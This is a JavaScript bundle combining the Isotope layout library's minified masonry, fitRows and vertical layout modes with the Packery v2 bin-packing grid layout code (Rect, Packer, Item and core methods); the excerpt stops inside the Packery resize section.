o=i.prototype,n=["_resetLayout","_getItemLayoutPosition","_manageStamp","_getContainerSize","_getElementOffset","needsResizeLayout","_getOption"];return n.forEach(function(t){o[t]=function(){return e.prototype[t].apply(this.isotope,arguments)}}),o.needsVerticalResizeLayout=function(){var e=t(this.isotope.element),i=this.isotope.size&&e;return i&&e.innerHeight!=this.isotope.size.innerHeight},o._getMeasurement=function(){this.isotope._getMeasurement.apply(this,arguments)},o.getColumnWidth=function(){this.getSegmentSize("column","Width")},o.getRowHeight=function(){this.getSegmentSize("row","Height")},o.getSegmentSize=function(t,e){var i=t+e,o="outer"+e;if(this._getMeasurement(i,o),!this[i]){var n=this.getFirstItemSize();this[i]=n&&n[o]||this.isotope.size["inner"+e]}},o.getFirstItemSize=function(){var e=this.isotope.filteredItems[0];return e&&e.element&&t(e.element)},o.layout=function(){this.isotope.layout.apply(this.isotope,arguments)},o.getSize=function(){this.isotope.getSize(),this.size=this.isotope.size},i.modes={},i.create=function(t,e){function n(){i.apply(this,arguments)}return n.prototype=Object.create(o),n.prototype.constructor=n,e&&(n.options=e),n.prototype.namespace=t,i.modes[t]=n,n},i}),function(t,e){"function"==typeof define&&define.amd?define("masonry-layout/masonry",["outlayer/outlayer","get-size/get-size"],e):"object"==typeof module&&module.exports?module.exports=e(require("outlayer"),require("get-size")):t.Masonry=e(t.Outlayer,t.getSize)}(window,function(t,e){var i=t.create("masonry");i.compatOptions.fitWidth="isFitWidth";var o=i.prototype;return o._resetLayout=function(){this.getSize(),this._getMeasurement("columnWidth","outerWidth"),this._getMeasurement("gutter","outerWidth"),this.measureColumns(),this.colYs=[];for(var t=0;t<this.cols;t++)this.colYs.push(0);this.maxY=0,this.horizontalColIndex=0},o.measureColumns=function(){if(this.getContainerWidth(),!this.columnWidth){var t=this.items[0],i=t&&t.element;this.columnWidth=i&&e(i).outerWidth||this.containerWidth}var o=this.columnWidth+=this.gutter,n=this.containerWidth+this.gutter,s=n/o,r=o-n%o,a=r&&r<1?"round":"floor";s=Math[a](s),this.cols=Math.max(s,1)},o.getContainerWidth=function(){var t=this._getOption("fitWidth"),i=t?this.element.parentNode:this.element,o=e(i);this.containerWidth=o&&o.innerWidth},o._getItemLayoutPosition=function(t){t.getSize();var e=t.size.outerWidth%this.columnWidth,i=e&&e<1?"round":"ceil",o=Math[i](t.size.outerWidth/this.columnWidth);o=Math.min(o,this.cols);for(var n=this.options.horizontalOrder?"_getHorizontalColPosition":"_getTopColPosition",s=this[n](o,t),r={x:this.columnWidth*s.col,y:s.y},a=s.y+t.size.outerHeight,u=o+s.col,h=s.col;h<u;h++)this.colYs[h]=a;return r},o._getTopColPosition=function(t){var e=this._getTopColGroup(t),i=Math.min.apply(Math,e);return{col:e.indexOf(i),y:i}},o._getTopColGroup=function(t){if(t<2)return this.colYs;for(var e=[],i=this.cols+1-t,o=0;o<i;o++)e[o]=this._getColGroupY(o,t);return e},o._getColGroupY=function(t,e){if(e<2)return this.colYs[t];var i=this.colYs.slice(t,t+e);return Math.max.apply(Math,i)},o._getHorizontalColPosition=function(t,e){var i=this.horizontalColIndex%this.cols,o=t>1&&i+t>this.cols;i=o?0:i;var n=e.size.outerWidth&&e.size.outerHeight;return this.horizontalColIndex=n?i+t:this.horizontalColIndex,{col:i,y:this._getColGroupY(i,t)}},o._manageStamp=function(t){var i=e(t),o=this._getElementOffset(t),n=this._getOption("originLeft"),s=n?o.left:o.right,r=s+i.outerWidth,a=Math.floor(s/this.columnWidth);a=Math.max(0,a);var u=Math.floor(r/this.columnWidth);u-=r%this.columnWidth?0:1,u=Math.min(this.cols-1,u);for(var h=this._getOption("originTop"),d=(h?o.top:o.bottom)+i.outerHeight,l=a;l<=u;l++)this.colYs[l]=Math.max(d,this.colYs[l])},o._getContainerSize=function(){this.maxY=Math.max.apply(Math,this.colYs);var t={height:this.maxY};return this._getOption("fitWidth")&&(t.width=this._getContainerFitWidth()),t},o._getContainerFitWidth=function(){for(var t=0,e=this.cols;--e&&0===this.colYs[e];)t++;return(this.cols-t)*this.columnWidth-this.gutter},o.needsResizeLayout=function(){var t=this.containerWidth;return this.getContainerWidth(),t!=this.containerWidth},i}),function(t,e){"function"==typeof define&&define.amd?define("isotope-layout/js/layout-modes/masonry",["../layout-mode","masonry-layout/masonry"],e):"object"==typeof module&&module.exports?module.exports=e(require("../layout-mode"),require("masonry-layout")):e(t.Isotope.LayoutMode,t.Masonry)}(window,function(t,e){"use strict";var i=t.create("masonry"),o=i.prototype,n={_getElementOffset:!0,layout:!0,_getMeasurement:!0};for(var s in e.prototype)n[s]||(o[s]=e.prototype[s]);var r=o.measureColumns;o.measureColumns=function(){this.items=this.isotope.filteredItems,r.call(this)};var a=o._getOption;return o._getOption=function(t){return"fitWidth"==t?void 0!==this.options.isFitWidth?this.options.isFitWidth:this.options.fitWidth:a.apply(this.isotope,arguments)},i}),function(t,e){"function"==typeof define&&define.amd?define("isotope-layout/js/layout-modes/fit-rows",["../layout-mode"],e):"object"==typeof exports?module.exports=e(require("../layout-mode")):e(t.Isotope.LayoutMode)}(window,function(t){"use strict";var e=t.create("fitRows"),i=e.prototype;return i._resetLayout=function(){this.x=0,this.y=0,this.maxY=0,this._getMeasurement("gutter","outerWidth")},i._getItemLayoutPosition=function(t){t.getSize();var e=t.size.outerWidth+this.gutter,i=this.isotope.size.innerWidth+this.gutter;0!==this.x&&e+this.x>i&&(this.x=0,this.y=this.maxY);var o={x:this.x,y:this.y};return this.maxY=Math.max(this.maxY,this.y+t.size.outerHeight),this.x+=e,o},i._getContainerSize=function(){return{height:this.maxY}},e}),function(t,e){"function"==typeof define&&define.amd?define("isotope-layout/js/layout-modes/vertical",["../layout-mode"],e):"object"==typeof module&&module.exports?module.exports=e(require("../layout-mode")):e(t.Isotope.LayoutMode)}(window,function(t){"use strict";var e=t.create("vertical",{horizontalAlignment:0}),i=e.prototype;return i._resetLayout=function(){this.y=0},i._getItemLayoutPosition=function(t){t.getSize();var e=(this.isotope.size.innerWidth-t.size.outerWidth)*this.options.horizontalAlignment,i=this.y;return this.y+=t.size.outerHeight,{x:e,y:i}},i._getContainerSize=function(){return{height:this.y}},e}),function(t,e){"function"==typeof define&&define.amd?define(["outlayer/outlayer","get-size/get-size","desandro-matches-selector/matches-selector","fizzy-ui-utils/utils","isotope-layout/js/item","isotope-layout/js/layout-mode","isotope-layout/js/layout-modes/masonry","isotope-layout/js/layout-modes/fit-rows","isotope-layout/js/layout-modes/vertical"],function(i,o,n,s,r,a){return e(t,i,o,n,s,r,a)}):"object"==typeof module&&module.exports?module.exports=e(t,require("outlayer"),require("get-size"),require("desandro-matches-selector"),require("fizzy-ui-utils"),require("isotope-layout/js/item"),require("isotope-layout/js/layout-mode"),require("isotope-layout/js/layout-modes/masonry"),require("isotope-layout/js/layout-modes/fit-rows"),require("isotope-layout/js/layout-modes/vertical")):t.Isotope=e(t,t.Outlayer,t.getSize,t.matchesSelector,t.fizzyUIUtils,t.Isotope.Item,t.Isotope.LayoutMode)}(window,function(t,e,i,o,n,s,r){function a(t,e){return function(i,o){for(var n=0;n<t.length;n++){var s=t[n],r=i.sortData[s],a=o.sortData[s];if(r>a||r<a){var u=void 0!==e[s]?e[s]:e,h=u?1:-1;return(r>a?1:-1)*h}}return 0}}var u=t.jQuery,h=String.prototype.trim?function(t){return t.trim()}:function(t){return t.replace(/^\s+|\s+$/g,"")},d=e.create("isotope",{layoutMode:"masonry",isJQueryFiltering:!0,sortAscending:!0});d.Item=s,d.LayoutMode=r;var l=d.prototype;l._create=function(){this.itemGUID=0,this._sorters={},this._getSorters(),e.prototype._create.call(this),this.modes={},this.filteredItems=this.items,this.sortHistory=["original-order"];for(var t in r.modes)this._initLayoutMode(t)},l.reloadItems=function(){this.itemGUID=0,e.prototype.reloadItems.call(this)},l._itemize=function(){for(var t=e.prototype._itemize.apply(this,arguments),i=0;i<t.length;i++){var o=t[i];o.id=this.itemGUID++}return this._updateItemsSortData(t),t},l._initLayoutMode=function(t){var e=r.modes[t],i=this.options[t]||{};this.options[t]=e.options?n.extend(e.options,i):i,this.modes[t]=new e(this)},l.layout=function(){return!this._isLayoutInited&&this._getOption("initLayout")?void this.arrange():void this._layout()},l._layout=function(){var t=this._getIsInstant();this._resetLayout(),this._manageStamps(),this.layoutItems(this.filteredItems,t),this._isLayoutInited=!0},l.arrange=function(t){this.option(t),this._getIsInstant();var e=this._filter(this.items);this.filteredItems=e.matches,this._bindArrangeComplete(),this._isInstant?this._noTransition(this._hideReveal,[e]):this._hideReveal(e),this._sort(),this._layout()},l._init=l.arrange,l._hideReveal=function(t){this.reveal(t.needReveal),this.hide(t.needHide)},l._getIsInstant=function(){var t=this._getOption("layoutInstant"),e=void 0!==t?t:!this._isLayoutInited;return this._isInstant=e,e},l._bindArrangeComplete=function(){function t(){e&&i&&o&&n.dispatchEvent("arrangeComplete",null,[n.filteredItems])}var e,i,o,n=this;this.once("layoutComplete",function(){e=!0,t()}),this.once("hideComplete",function(){i=!0,t()}),this.once("revealComplete",function(){o=!0,t()})},l._filter=function(t){var e=this.options.filter;e=e||"*";for(var i=[],o=[],n=[],s=this._getFilterTest(e),r=0;r<t.length;r++){var a=t[r];if(!a.isIgnored){var u=s(a);u&&i.push(a),u&&a.isHidden?o.push(a):u||a.isHidden||n.push(a)}}return{matches:i,needReveal:o,needHide:n}},l._getFilterTest=function(t){return u&&this.options.isJQueryFiltering?function(e){return u(e.element).is(t);
}:"function"==typeof t?function(e){return t(e.element)}:function(e){return o(e.element,t)}},l.updateSortData=function(t){var e;t?(t=n.makeArray(t),e=this.getItems(t)):e=this.items,this._getSorters(),this._updateItemsSortData(e)},l._getSorters=function(){var t=this.options.getSortData;for(var e in t){var i=t[e];this._sorters[e]=f(i)}},l._updateItemsSortData=function(t){for(var e=t&&t.length,i=0;e&&i<e;i++){var o=t[i];o.updateSortData()}};var f=function(){function t(t){if("string"!=typeof t)return t;var i=h(t).split(" "),o=i[0],n=o.match(/^\[(.+)\]$/),s=n&&n[1],r=e(s,o),a=d.sortDataParsers[i[1]];return t=a?function(t){return t&&a(r(t))}:function(t){return t&&r(t)}}function e(t,e){return t?function(e){return e.getAttribute(t)}:function(t){var i=t.querySelector(e);return i&&i.textContent}}return t}();d.sortDataParsers={parseInt:function(t){return parseInt(t,10)},parseFloat:function(t){return parseFloat(t)}},l._sort=function(){if(this.options.sortBy){var t=n.makeArray(this.options.sortBy);this._getIsSameSortBy(t)||(this.sortHistory=t.concat(this.sortHistory));var e=a(this.sortHistory,this.options.sortAscending);this.filteredItems.sort(e)}},l._getIsSameSortBy=function(t){for(var e=0;e<t.length;e++)if(t[e]!=this.sortHistory[e])return!1;return!0},l._mode=function(){var t=this.options.layoutMode,e=this.modes[t];if(!e)throw new Error("No layout mode: "+t);return e.options=this.options[t],e},l._resetLayout=function(){e.prototype._resetLayout.call(this),this._mode()._resetLayout()},l._getItemLayoutPosition=function(t){return this._mode()._getItemLayoutPosition(t)},l._manageStamp=function(t){this._mode()._manageStamp(t)},l._getContainerSize=function(){return this._mode()._getContainerSize()},l.needsResizeLayout=function(){return this._mode().needsResizeLayout()},l.appended=function(t){var e=this.addItems(t);if(e.length){var i=this._filterRevealAdded(e);this.filteredItems=this.filteredItems.concat(i)}},l.prepended=function(t){var e=this._itemize(t);if(e.length){this._resetLayout(),this._manageStamps();var i=this._filterRevealAdded(e);this.layoutItems(this.filteredItems),this.filteredItems=i.concat(this.filteredItems),this.items=e.concat(this.items)}},l._filterRevealAdded=function(t){var e=this._filter(t);return this.hide(e.needHide),this.reveal(e.matches),this.layoutItems(e.matches,!0),e.matches},l.insert=function(t){var e=this.addItems(t);if(e.length){var i,o,n=e.length;for(i=0;i<n;i++)o=e[i],this.element.appendChild(o.element);var s=this._filter(e).matches;for(i=0;i<n;i++)e[i].isLayoutInstant=!0;for(this.arrange(),i=0;i<n;i++)delete e[i].isLayoutInstant;this.reveal(s)}};var c=l.remove;return l.remove=function(t){t=n.makeArray(t);var e=this.getItems(t);c.call(this,t);for(var i=e&&e.length,o=0;i&&o<i;o++){var s=e[o];n.removeFrom(this.filteredItems,s)}},l.shuffle=function(){for(var t=0;t<this.items.length;t++){var e=this.items[t];e.sortData.random=Math.random()}this.options.sortBy="random",this._sort(),this._layout()},l._noTransition=function(t,e){var i=this.options.transitionDuration;this.options.transitionDuration=0;var o=t.apply(this,e);return this.options.transitionDuration=i,o},l.getFilteredItemElements=function(){return this.filteredItems.map(function(t){return t.element})},d});

/*!
 * Packery layout mode PACKAGED v2.0.1
 * sub-classes Packery
 */

/**
 * Rect
 * low-level utility class for basic geometry
 */

( function( window, factory ) {
    // universal module definition
    /* jshint strict: false */ /* globals define, module */
    if ( typeof define == 'function' && define.amd ) {
        // AMD
        define( 'packery/js/rect',factory );
    } else if ( typeof module == 'object' && module.exports ) {
        // CommonJS
        module.exports = factory();
    } else {
        // browser global
        window.Packery = window.Packery || {};
        window.Packery.Rect = factory();
    }

}( window, function factory() {


// -------------------------- Rect -------------------------- //

    function Rect( props ) {
        // extend properties from defaults
        for ( var prop in Rect.defaults ) {
            this[ prop ] = Rect.defaults[ prop ];
        }

        for ( prop in props ) {
            this[ prop ] = props[ prop ];
        }

    }

    Rect.defaults = {
        x: 0,
        y: 0,
        width: 0,
        height: 0
    };

    var proto = Rect.prototype;

    /**
     * Determines whether or not this rectangle wholly encloses another rectangle or point.
     * @param {Rect} rect
     * @returns {Boolean}
     **/
    proto.contains = function( rect ) {
        // points don't have width or height
        var otherWidth = rect.width || 0;
        var otherHeight = rect.height || 0;
        return this.x <= rect.x &&
            this.y <= rect.y &&
            this.x + this.width >= rect.x + otherWidth &&
            this.y + this.height >= rect.y + otherHeight;
    };

    /**
     * Determines whether or not the rectangle intersects with another.
     * @param {Rect} rect
     * @returns {Boolean}
     **/
    proto.overlaps = function( rect ) {
        var thisRight = this.x + this.width;
        var thisBottom = this.y + this.height;
        var rectRight = rect.x + rect.width;
        var rectBottom = rect.y + rect.height;

        // http://stackoverflow.com/a/306332
        return this.x < rectRight &&
            thisRight > rect.x &&
            this.y < rectBottom &&
            thisBottom > rect.y;
    };

    /**
     * @param {Rect} rect - the overlapping rect
     * @returns {Array} freeRects - rects representing the area around the rect
     **/
    proto.getMaximalFreeRects = function( rect ) {

        // if no intersection, return false
        if ( !this.overlaps( rect ) ) {
            return false;
        }

        var freeRects = [];
        var freeRect;

        var thisRight = this.x + this.width;
        var thisBottom = this.y + this.height;
        var rectRight = rect.x + rect.width;
        var rectBottom = rect.y + rect.height;

        // top
        if ( this.y < rect.y ) {
            freeRect = new Rect({
                x: this.x,
                y: this.y,
                width: this.width,
                height: rect.y - this.y
            });
            freeRects.push( freeRect );
        }

        // right
        if ( thisRight > rectRight ) {
            freeRect = new Rect({
                x: rectRight,
                y: this.y,
                width: thisRight - rectRight,
                height: this.height
            });
            freeRects.push( freeRect );
        }

        // bottom
        if ( thisBottom > rectBottom ) {
            freeRect = new Rect({
                x: this.x,
                y: rectBottom,
                width: this.width,
                height: thisBottom - rectBottom
            });
            freeRects.push( freeRect );
        }

        // left
        if ( this.x < rect.x ) {
            freeRect = new Rect({
                x: this.x,
                y: this.y,
                width: rect.x - this.x,
                height: this.height
            });
            freeRects.push( freeRect );
        }

        return freeRects;
    };

    proto.canFit = function( rect ) {
        return this.width >= rect.width && this.height >= rect.height;
    };

    return Rect;

}));

/**
 * Packer
 * bin-packing algorithm
 */

( function( window, factory ) {
    // universal module definition
    /* jshint strict: false */ /* globals define, module, require */
    if ( typeof define == 'function' && define.amd ) {
        // AMD
        define( 'packery/js/packer',[ './rect' ], factory );
    } else if ( typeof module == 'object' && module.exports ) {
        // CommonJS
        module.exports = factory(
            require('./rect')
        );
    } else {
        // browser global
        var Packery = window.Packery = window.Packery || {};
        Packery.Packer = factory( Packery.Rect );
    }

}( window, function factory( Rect ) {


// -------------------------- Packer -------------------------- //

    /**
     * @param {Number} width
     * @param {Number} height
     * @param {String} sortDirection
     *   topLeft for vertical, leftTop for horizontal
     */
    function Packer( width, height, sortDirection ) {
        this.width = width || 0;
        this.height = height || 0;
        this.sortDirection = sortDirection || 'downwardLeftToRight';

        this.reset();
    }

    var proto = Packer.prototype;

    proto.reset = function() {
        this.spaces = [];

        var initialSpace = new Rect({
            x: 0,
            y: 0,
            width: this.width,
            height: this.height
        });

        this.spaces.push( initialSpace );
        // set sorter
        this.sorter = sorters[ this.sortDirection ] || sorters.downwardLeftToRight;
    };

// change x and y of rect to fit with in Packer's available spaces
    proto.pack = function( rect ) {
        for ( var i=0; i < this.spaces.length; i++ ) {
            var space = this.spaces[i];
            if ( space.canFit( rect ) ) {
                this.placeInSpace( rect, space );
                break;
            }
        }
    };

    proto.columnPack = function( rect ) {
        for ( var i=0; i < this.spaces.length; i++ ) {
            var space = this.spaces[i];
            var canFitInSpaceColumn = space.x <= rect.x &&
                space.x + space.width >= rect.x + rect.width &&
                space.height >= rect.height - 0.01; // fudge number for rounding error
            if ( canFitInSpaceColumn ) {
                rect.y = space.y;
                this.placed( rect );
                break;
            }
        }
    };

    proto.rowPack = function( rect ) {
        for ( var i=0; i < this.spaces.length; i++ ) {
            var space = this.spaces[i];
            var canFitInSpaceRow = space.y <= rect.y &&
                space.y + space.height >= rect.y + rect.height &&
                space.width >= rect.width - 0.01; // fudge number for rounding error
            if ( canFitInSpaceRow ) {
                rect.x = space.x;
                this.placed( rect );
                break;
            }
        }
    };

    proto.placeInSpace = function( rect, space ) {
        // place rect in space
        rect.x = space.x;
        rect.y = space.y;

        this.placed( rect );
    };

// update spaces with placed rect
    proto.placed = function( rect ) {
        // update spaces
        var revisedSpaces = [];
        for ( var i=0; i < this.spaces.length; i++ ) {
            var space = this.spaces[i];
            var newSpaces = space.getMaximalFreeRects( rect );
            // add either the original space or the new spaces to the revised spaces
            if ( newSpaces ) {
                revisedSpaces.push.apply( revisedSpaces, newSpaces );
            } else {
                revisedSpaces.push( space );
            }
        }

        this.spaces = revisedSpaces;

        this.mergeSortSpaces();
    };

    proto.mergeSortSpaces = function() {
        // remove redundant spaces
        Packer.mergeRects( this.spaces );
        this.spaces.sort( this.sorter );
    };

// add a space back
    proto.addSpace = function( rect ) {
        this.spaces.push( rect );
        this.mergeSortSpaces();
    };

// -------------------------- utility functions -------------------------- //

    /**
     * Remove redundant rectangle from array of rectangles
     * @param {Array} rects: an array of Rects
     * @returns {Array} rects: an array of Rects
     **/
    Packer.mergeRects = function( rects ) {
        var i = 0;
        var rect = rects[i];

        rectLoop:
            while ( rect ) {
                var j = 0;
                var compareRect = rects[ i + j ];

                while ( compareRect ) {
                    if  ( compareRect == rect ) {
                        j++; // next
                    } else if ( compareRect.contains( rect ) ) {
                        // remove rect
                        rects.splice( i, 1 );
                        rect = rects[i]; // set next rect
                        continue rectLoop; // bail on compareLoop
                    } else if ( rect.contains( compareRect ) ) {
                        // remove compareRect
                        rects.splice( i + j, 1 );
                    } else {
                        j++;
                    }
                    compareRect = rects[ i + j ]; // set next compareRect
                }
                i++;
                rect = rects[i];
            }

        return rects;
    };


// -------------------------- sorters -------------------------- //

// functions for sorting rects in order
    var sorters = {
        // top down, then left to right
        downwardLeftToRight: function( a, b ) {
            return a.y - b.y || a.x - b.x;
        },
        // left to right, then top down
        rightwardTopToBottom: function( a, b ) {
            return a.x - b.x || a.y - b.y;
        }
    };


// --------------------------  -------------------------- //

    return Packer;

}));

/**
 * Packery Item Element
 **/

( function( window, factory ) {
    // universal module definition
    /* jshint strict: false */ /* globals define, module, require */
    if ( typeof define == 'function' && define.amd ) {
        // AMD
        define( 'packery/js/item',[
                'outlayer/outlayer',
                './rect'
            ],
            factory );
    } else if ( typeof module == 'object' && module.exports ) {
        // CommonJS
        module.exports = factory(
            require('outlayer'),
            require('./rect')
        );
    } else {
        // browser global
        window.Packery.Item = factory(
            window.Outlayer,
            window.Packery.Rect
        );
    }

}( window, function factory( Outlayer, Rect ) {


// -------------------------- Item -------------------------- //

    var docElemStyle = document.documentElement.style;

    var transformProperty = typeof docElemStyle.transform == 'string' ?
        'transform' : 'WebkitTransform';

// sub-class Item
    var Item = function PackeryItem() {
        Outlayer.Item.apply( this, arguments );
    };

    var proto = Item.prototype = Object.create( Outlayer.Item.prototype );

    var __create = proto._create;
    proto._create = function() {
        // call default _create logic
        __create.call( this );
        this.rect = new Rect();
    };

    var _moveTo = proto.moveTo;
    proto.moveTo = function( x, y ) {
        // don't shift 1px while dragging
        var dx = Math.abs( this.position.x - x );
        var dy = Math.abs( this.position.y - y );

        var canHackGoTo = this.layout.dragItemCount && !this.isPlacing &&
            !this.isTransitioning && dx < 1 && dy < 1;
        if ( canHackGoTo ) {
            this.goTo( x, y );
            return;
        }
        _moveTo.apply( this, arguments );
    };

// -------------------------- placing -------------------------- //

    proto.enablePlacing = function() {
        this.removeTransitionStyles();
        // remove transform property from transition
        if ( this.isTransitioning && transformProperty ) {
            this.element.style[ transformProperty ] = 'none';
        }
        this.isTransitioning = false;
        this.getSize();
        this.layout._setRectSize( this.element, this.rect );
        this.isPlacing = true;
    };

    proto.disablePlacing = function() {
        this.isPlacing = false;
    };

// -----  ----- //

// remove element from DOM
    proto.removeElem = function() {
        this.element.parentNode.removeChild( this.element );
        // add space back to packer
        this.layout.packer.addSpace( this.rect );
        this.emitEvent( 'remove', [ this ] );
    };

// ----- dropPlaceholder ----- //

    proto.showDropPlaceholder = function() {
        var dropPlaceholder = this.dropPlaceholder;
        if ( !dropPlaceholder ) {
            // create dropPlaceholder
            dropPlaceholder = this.dropPlaceholder = document.createElement('div');
            dropPlaceholder.className = 'packery-drop-placeholder';
            dropPlaceholder.style.position = 'absolute';
        }

        dropPlaceholder.style.width = this.size.width + 'px';
        dropPlaceholder.style.height = this.size.height + 'px';
        this.positionDropPlaceholder();
        this.layout.element.appendChild( dropPlaceholder );
    };

    proto.positionDropPlaceholder = function() {
        this.dropPlaceholder.style[ transformProperty ] = 'translate(' +
            this.rect.x + 'px, ' + this.rect.y + 'px)';
    };

    proto.hideDropPlaceholder = function() {
        this.layout.element.removeChild( this.dropPlaceholder );
    };

// -----  ----- //

    return Item;

}));

/*!
 * Packery v2.0.0
 * Gapless, draggable grid layouts
 *
 * Licensed GPLv3 for open source use
 * or Packery Commercial License for commercial use
 *
 * http://packery.metafizzy.co
 * Copyright 2016 Metafizzy
 */

( function( window, factory ) {
    // universal module definition
    /* jshint strict: false */ /* globals define, module, require */
    if ( typeof define == 'function' && define.amd ) {
        // AMD
        define( 'packery/js/packery',[
                'get-size/get-size',
                'outlayer/outlayer',
                './rect',
                './packer',
                './item'
            ],
            factory );
    } else if ( typeof module == 'object' && module.exports ) {
        // CommonJS
        module.exports = factory(
            require('get-size'),
            require('outlayer'),
            require('./rect'),
            require('./packer'),
            require('./item')
        );
    } else {
        // browser global
        window.Packery = factory(
            window.getSize,
            window.Outlayer,
            window.Packery.Rect,
            window.Packery.Packer,
            window.Packery.Item
        );
    }

}( window, function factory( getSize, Outlayer, Rect, Packer, Item ) {


// ----- Rect ----- //

// allow for pixel rounding errors IE8-IE11 & Firefox; #227
    Rect.prototype.canFit = function( rect ) {
        return this.width >= rect.width - 1 && this.height >= rect.height - 1;
    };

// -------------------------- Packery -------------------------- //

// create an Outlayer layout class
    var Packery = Outlayer.create('packery');
    Packery.Item = Item;

    var proto = Packery.prototype;

    proto._create = function() {
        // call super
        Outlayer.prototype._create.call( this );

        // initial properties
        this.packer = new Packer();
        // packer for drop targets
        this.shiftPacker = new Packer();
        this.isEnabled = true;

        this.dragItemCount = 0;

        // create drag handlers
        var _this = this;
        this.handleDraggabilly = {
            dragStart: function() {
                _this.itemDragStart( this.element );
            },
            dragMove: function() {
                _this.itemDragMove( this.element, this.position.x, this.position.y );
            },
            dragEnd: function() {
                _this.itemDragEnd( this.element );
            }
        };

        this.handleUIDraggable = {
            start: function handleUIDraggableStart( event, ui ) {
                // HTML5 may trigger dragstart, dismiss HTML5 dragging
                if ( !ui ) {
                    return;
                }
                _this.itemDragStart( event.currentTarget );
            },
            drag: function handleUIDraggableDrag( event, ui ) {
                if ( !ui ) {
                    return;
                }
                _this.itemDragMove( event.currentTarget, ui.position.left, ui.position.top );
            },
            stop: function handleUIDraggableStop( event, ui ) {
                if ( !ui ) {
                    return;
                }
                _this.itemDragEnd( event.currentTarget );
            }
        };

    };


// ----- init & layout ----- //

    /**
     * logic before any new layout
     */
    proto._resetLayout = function() {
        this.getSize();

        this._getMeasurements();

        // reset packer
        var width, height, sortDirection;
        // packer settings, if horizontal or vertical
        if ( this._getOption('horizontal') ) {
            width = Infinity;
            height = this.size.innerHeight + this.gutter;
            sortDirection = 'rightwardTopToBottom';
        } else {
            width = this.size.innerWidth + this.gutter;
            height = Infinity;
            sortDirection = 'downwardLeftToRight';
        }

        this.packer.width = this.shiftPacker.width = width;
        this.packer.height = this.shiftPacker.height = height;
        this.packer.sortDirection = this.shiftPacker.sortDirection = sortDirection;

        this.packer.reset();

        // layout
        this.maxY = 0;
        this.maxX = 0;
    };

    /**
     * update columnWidth, rowHeight, & gutter
     * @private
     */
    proto._getMeasurements = function() {
        this._getMeasurement( 'columnWidth', 'width' );
        this._getMeasurement( 'rowHeight', 'height' );
        this._getMeasurement( 'gutter', 'width' );
    };

    proto._getItemLayoutPosition = function( item ) {
        this._setRectSize( item.element, item.rect );
        if ( this.isShifting || this.dragItemCount > 0 ) {
            var packMethod = this._getPackMethod();
            this.packer[ packMethod ]( item.rect );
        } else {
            this.packer.pack( item.rect );
        }

        this._setMaxXY( item.rect );
        return item.rect;
    };

    proto.shiftLayout = function() {
        this.isShifting = true;
        this.layout();
        delete this.isShifting;
    };

    proto._getPackMethod = function() {
        return this._getOption('horizontal') ? 'rowPack' : 'columnPack';
    };


    /**
     * set max X and Y value, for size of container
     * @param {Packery.Rect} rect
     * @private
     */
    proto._setMaxXY = function( rect ) {
        this.maxX = Math.max( rect.x + rect.width, this.maxX );
        this.maxY = Math.max( rect.y + rect.height, this.maxY );
    };

    /**
     * set the width and height of a rect, applying columnWidth and rowHeight
     * @param {Element} elem
     * @param {Packery.Rect} rect
     */
    proto._setRectSize = function( elem, rect ) {
        var size = getSize( elem );
        var w = size.outerWidth;
        var h = size.outerHeight;
        // size for columnWidth and rowHeight, if available
        // only check if size is non-zero, #177
        if ( w || h ) {
            w = this._applyGridGutter( w, this.columnWidth );
            h = this._applyGridGutter( h, this.rowHeight );
        }
        // rect must fit in packer
        rect.width = Math.min( w, this.packer.width );
        rect.height = Math.min( h, this.packer.height );
    };

    /**
     * fits item to columnWidth/rowHeight and adds gutter
     * @param {Number} measurement - item width or height
     * @param {Number} gridSize - columnWidth or rowHeight
     * @returns measurement
     */
    proto._applyGridGutter = function( measurement, gridSize ) {
        // just add gutter if no gridSize
        if ( !gridSize ) {
            return measurement + this.gutter;
        }
        gridSize += this.gutter;
        // fit item to columnWidth/rowHeight
        var remainder = measurement % gridSize;
        var mathMethod = remainder && remainder < 1 ? 'round' : 'ceil';
        measurement = Math[ mathMethod ]( measurement / gridSize ) * gridSize;
        return measurement;
    };

    proto._getContainerSize = function() {
        if ( this._getOption('horizontal') ) {
            return {
                width: this.maxX - this.gutter
            };
        } else {
            return {
                height: this.maxY - this.gutter
            };
        }
    };


// -------------------------- stamp -------------------------- //

    /**
     * makes space for element
     * @param {Element} elem
     */
    proto._manageStamp = function( elem ) {

        var item = this.getItem( elem );
        var rect;
        if ( item && item.isPlacing ) {
            rect = item.rect;
        } else {
            var offset = this._getElementOffset( elem );
            rect = new Rect({
                x: this._getOption('originLeft') ? offset.left : offset.right,
                y: this._getOption('originTop') ? offset.top : offset.bottom
            });
        }

        this._setRectSize( elem, rect );
        // save its space in the packer
        this.packer.placed( rect );
        this._setMaxXY( rect );
    };

// -------------------------- methods -------------------------- //

    function verticalSorter( a, b ) {
        return a.position.y - b.position.y || a.position.x - b.position.x;
    }

    function horizontalSorter( a, b ) {
        return a.position.x - b.position.x || a.position.y - b.position.y;
    }

    proto.sortItemsByPosition = function() {
        var sorter = this._getOption('horizontal') ? horizontalSorter : verticalSorter;
        this.items.sort( sorter );
    };

    /**
     * Fit item element in its current position
     * Packery will position elements around it
     * useful for expanding elements
     *
     * @param {Element} elem
     * @param {Number} x - horizontal destination position, optional
     * @param {Number} y - vertical destination position, optional
     */
    proto.fit = function( elem, x, y ) {
        var item = this.getItem( elem );
        if ( !item ) {
            return;
        }

        // stamp item to get it out of layout
        this.stamp( item.element );
        // set placing flag
        item.enablePlacing();
        this.updateShiftTargets( item );
        // fall back to current position for fitting
        x = x === undefined ? item.rect.x: x;
        y = y === undefined ? item.rect.y: y;
        // position it best at its destination
        this.shift( item, x, y );
        this._bindFitEvents( item );
        item.moveTo( item.rect.x, item.rect.y );
        // layout everything else
        this.shiftLayout();
        // return back to regularly scheduled programming
        this.unstamp( item.element );
        this.sortItemsByPosition();
        item.disablePlacing();
    };

    /**
     * emit event when item is fit and other items are laid out
     * @param {Packery.Item} item
     * @private
     */
    proto._bindFitEvents = function( item ) {
        var _this = this;
        var ticks = 0;
        function onLayout() {
            ticks++;
            if ( ticks != 2 ) {
                return;
            }
            _this.dispatchEvent( 'fitComplete', null, [ item ] );
        }
        // when item is laid out
        item.once( 'layout', onLayout );
        // when all items are laid out
        this.once( 'layoutComplete', onLayout );
    };

// -------------------------- resize -------------------------- //

// debounced, layout on resize
    proto.resize = function() {
        // don't trigger if size did not change
        // or if resize was unbound. See #285, outlayer#9
        if ( !this.isResizeBound || !this.needsResizeLayout() ) {
            return;
        }

        if ( this.options.shiftPercentResize ) {
            this.resizeShiftPercentLayout();
        } else {
            this.layout();
        }
    };

    /**
     * check if layout is needed post layout
     * @returns Boolean
     */
